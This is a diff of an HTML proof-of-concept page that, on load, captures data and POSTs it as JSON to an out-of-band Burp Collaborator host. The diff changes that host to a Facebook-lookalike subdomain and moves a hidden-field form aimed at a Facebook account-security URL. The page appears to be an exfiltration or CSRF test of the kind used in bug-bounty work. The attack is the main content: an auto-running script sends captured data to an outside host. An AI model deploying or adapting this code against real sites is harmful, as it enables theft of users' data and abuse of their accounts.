@@ -6,11 +6,6 @@
     <title>Capture and Send to Burp Collaborator</title>
 </head>
 <body>
-    <form id="myForm" method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1">
-        <input type="hidden" name="hide_back_button" value="1">
-        <input type="hidden" name="from_accounts_center" value="1">
-        <input type="submit" value="Send">
-    </form>
     <script>
         // Function to capture and send data to Burp Collaborator
         function captureAndSendToBurpCollaborator() {
@@ -41,7 +36,7 @@
 
             // Send captured data to Burp Collaborator
             var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro', true); // Change to HTTPS
+            xhr.open('POST', 'https://wwww.facebook.com.co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro', true); // Change to HTTPS
             xhr.setRequestHeader('Content-Type', 'application/json');
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === XMLHttpRequest.DONE) {
@@ -51,10 +46,17 @@
             xhr.send(jsonData);
         }
 
-        // Capture data when the page is loaded
+        // Listen for the window load event to capture data after redirection
         window.onload = function() {
             captureAndSendToBurpCollaborator();
         };
     </script>
+    
+    <!-- Form submission is triggered after page load -->
+    <form id="myForm" method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1">
+        <input type="hidden" name="hide_back_button" value="1">
+        <input type="hidden" name="from_accounts_center" value="1">
+        <input type="submit" value="Send">
+    </form>
 </body>
 </html>
